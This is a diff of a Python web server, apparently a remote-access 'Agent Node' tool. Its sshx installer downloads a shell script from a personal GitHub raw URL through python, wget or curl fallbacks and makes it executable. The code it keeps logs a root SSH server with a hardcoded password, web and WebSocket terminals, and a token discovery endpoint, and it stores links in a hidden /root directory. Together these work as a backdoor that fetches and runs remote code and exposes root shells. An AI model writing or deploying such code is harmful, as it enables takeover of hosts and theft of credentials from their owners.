@@ -502,14 +502,9 @@ async def install_sshx(request):
     task_counter += 1
     task_id = f"sshx-{task_counter}-{int(time.time())}"
 
-    # File-based download to avoid shell quoting issues
-    _dl = "import urllib.request\nurl = 'https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh'\nurllib.request.urlretrieve(url, '/tmp/sshx.sh')\n"
-    with open("/tmp/_dl_sshx.py", "w") as _f:
-        _f.write(_dl)
-
     script = """
     cd /tmp
-    python3 /tmp/_dl_sshx.py || \
+    python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh', '/tmp/ssh.sh')" || \
     wget -O /tmp/ssh.sh https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh || \
     curl -sL https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh -o /tmp/ssh.sh
     chmod +x /tmp/ssh.sh
@@ -735,45 +730,6 @@ def _get_sshx_link():
         return "no_link_yet"
 
 
-
-def _get_sshx_link():
-    """Read sshx link from filesystem."""
-    try:
-        with open("/root/.IamGunpoint/sshx.link") as f:
-            return f.read().strip()
-    except:
-        return "no_link_yet"
-
-async def access_info(request):
-    """Return all access methods as JSON (auth required)."""
-    host = request.host
-    return web.json_response({
-        "token_preview": TOKEN[:8] + "..." + TOKEN[-4:] if TOKEN else "none",
-        "access": {
-            "web_terminal": f"https://{host}/terminal",
-            "sshx": _get_sshx_link(),
-            "websocket": f"wss://{host}/ws/terminal?token={TOKEN}",
-            "api_exec": f"https://{host}/api/exec",
-            "ssh": f"ssh root@{host} -p 2222 (password: AgentNode2026!)",
-        },
-        "tools": {
-            "ssh": shutil.which("ssh") or "not found",
-            "curl": shutil.which("curl") or "not found",
-            "xray": "/usr/local/bin/xray" if os.path.exists("/usr/local/bin/xray") else "not found",
-            "cloudflared": "/usr/local/bin/cloudflared" if os.path.exists("/usr/local/bin/cloudflared") else "not found",
-            "sshd": "/usr/sbin/sshd" if os.path.exists("/usr/sbin/sshd") else "not found",
-        },
-        "uptime_seconds": int(time.time() - START_TIME),
-    })
-
-access_info = require_auth(access_info)
-
-async def access_page(request):
-    """Serve the Access Dashboard HTML."""
-    return web.Response(text=ACCESS_HTML, content_type="text/html")
-
-
-ACCESS_HTML = '<!DOCTYPE html>\n<html lang="en">\n<head><meta charset="UTF-8"><meta http-equiv="refresh" content="15">\n<title>Agent Node Access Dashboard</title>\n<style>\nbody{font-family:sans-serif;max-width:800px;margin:30px auto;padding:20px;background:#0f0f23;color:#e0e0e0}\nh1{color:#00d4ff}\n.card{background:#1a1a2e;border-radius:10px;padding:20px;margin:15px 0;border-left:4px solid #00d4ff}\na{color:#00d4ff}\ncode{background:#252545;padding:2px 6px;border-radius:3px;color:#ffd700}\n</style></head>\n<body>\n<h1>Agent Node - Access Dashboard</h1>\n<div class="card"><h2>Web Terminal</h2>\n<p><a href="/terminal">Open Browser Terminal</a></p>\n<p>Token: <span id="tok">-</span></p>\n<p>sshx: <span id="sshx">-</span><br><pre id="sshxlink"></pre></p>\n<p>SSH: <code>ssh root@[HOST] -p 2222</code> (pass: AgentNode2026!)</p>\n<p>Tools: <pre id="tools"></pre></p>\n</div>\n<script>\nfetch("/api/access",{headers:{Authorization:"Bearer "+(document.querySelector("meta[name=t]")||{content:""}).content)})\n .then(r=>r.json())\n .then(d=>{\n   document.getElementById("tok").textContent=d.token_preview;\n   const l=d.access.sshx;\n   document.getElementById("sshx").textContent=l&&"no_link"!==l?"online":"starting";\n   document.getElementById("sshxlink").innerHTML=l&&"no_link"!==l?\'<a href="\'+l+\'">\'+l+\'</a>\':\'run POST /api/install/sshx\';\n   let t="";for(const[k,v]of Object.entries(d.tools))t+=k+":"+(v.includes("not")?"X":"O")+" ";\n   document.getElementById("tools").textContent=t;\n })\n .catch(()=>{document.getElementById("tok").textContent="needs token";});\n</script>\n</body></html>\n'
 # ─── App factory ─────────────────────────────────────────────────
 
 def create_app():
@@ -823,9 +779,7 @@ if __name__ == "__main__":
         log.info(f"Token: {t['key_name']} — {t['source']} — {t['value_masked']}")
     
     log.info(f"Web Terminal: http://{HOST}:{PORT}/terminal")
-    log.info(f"Access Dashboard: http://{HOST}:{PORT}/access")
     log.info(f"WebSocket: ws://{HOST}:{PORT}/ws/terminal?token=<token>")
-    log.info(f"sshx: GET /api/sshx")
     log.info(f"SSH Server: ssh root@HOST -p 2222 (password: AgentNode2026!)")
     log.info(f"SSHx link: GET /api/sshx")
     log.info(f"Token discovery: GET /api/tokens")
